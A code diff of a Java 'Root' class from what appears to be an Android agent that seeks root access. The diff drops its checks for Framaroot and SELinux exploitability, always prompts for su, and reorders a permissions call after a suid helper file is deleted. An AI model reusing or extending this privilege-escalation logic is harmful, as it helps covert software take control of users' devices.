@@ -721,15 +721,7 @@ public class Root {
 		boolean ask = false;
 
 		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
-			if (checkCyanogenmod()) {
-				// if (Cfg.SUPPORT_CYANOGENMOD) {
-				ask = true;
-				// }
-			} else {
-				boolean frama = checkFramarootExploitability();
-				boolean se = checkSELinuxExploitability();
-				ask = !(frama || se);
-			}
+			ask = true;
 		}
 
 		if (ask && askedSu < Cfg.MAX_ASKED_SU) {
@@ -1129,9 +1121,7 @@ public class Root {
 					}
 
 					Root.removeScript("fig");
-					if (getPermissions()) {
-						Status.self().setReload();
-					}
+
 				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " ERROR: (run), cannot create script");
@@ -1159,6 +1149,10 @@ public class Root {
 
 				file = new File(Status.getAppContext().getFilesDir(), suidext);
 				file.delete();
+
+				if (getPermissions()) {
+					Status.self().setReload();
+				}
 			}
 		}
 	}
